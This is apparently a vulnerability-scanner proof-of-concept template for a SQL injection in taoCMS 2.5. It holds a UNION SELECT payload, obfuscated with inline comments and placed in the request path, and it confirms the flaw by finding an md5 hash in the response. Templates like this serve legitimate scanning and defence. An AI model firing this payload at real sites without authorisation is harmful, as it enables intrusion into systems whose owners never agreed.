name: poc-yaml-taocms-sqli
rules:
set:
  rand: randomInt(200000000, 210000000)
  - method: GET
    path: /index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5({{rand}}),10,11%23&action=getatlbyid
    expression: |
      response.body.bcontains(bytes(md5(string(rand))))
detail:
  author: Rexus
  Affected Version: "2.5"
  links:
    - https://www.seebug.org/vuldb/ssvid-96931
